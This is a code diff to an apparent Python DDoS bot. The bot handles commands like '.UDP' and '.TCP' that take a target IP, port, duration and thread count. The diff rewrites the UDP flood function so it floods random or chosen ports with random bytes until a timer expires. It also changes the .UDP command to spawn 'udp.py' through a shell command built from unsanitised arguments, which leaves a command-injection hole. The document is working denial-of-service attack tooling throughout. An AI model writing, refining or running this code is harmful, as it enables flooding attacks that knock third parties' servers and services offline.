@@ -1,4 +1,4 @@
-import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
+import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl, asyncio, subprocess
 from struct import pack as data_pack
 from multiprocessing import Process
 from urllib.parse import urlparse
@@ -300,12 +300,18 @@ def GET_attack(ip, port, secs):
             scraper.get(ip, headers=headers)
 
 def attack_udp(ip, port, secs, size):
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        dport = random.randint(1, 65535) if port == 0 else port
-        data = random._urandom(size)
-        s.sendto(data, (ip, dport))
-        print('Pacote UDP Enviado')
+    clock = (lambda: 0, time.perf_counter)[secs > 0]
+    secs = (1, clock() + secs)[secs > 0]
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(size)
+    while True:
+        if clock() < secs:
+            if port == 0:
+                port = random.randint(1, 65535)
+            sock.sendto(bytes, (ip, port))
+            print("Attack Sent Success")    
+        else:
+            break
 
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
@@ -427,13 +433,15 @@ def main():
                 if command == '.UDP':
                     ip = args[1]
                     port = int(args[2])
-                    secs = time.time() + int(args[3])
+                    secs = int(args[3])
                     size = int(args[4])
                     threads = int(args[5])
 
-                    for _ in range(threads):
-                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
-                
+                    print(f"Running command: python3 udp.py {ip} {port} {secs} {threads} {size}")
+
+                    command = f'python3 udp.py {ip} {port} {secs} {threads} {size}'
+                    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
                 elif command == '.TCP':
                     ip = args[1]
                     port = int(args[2])
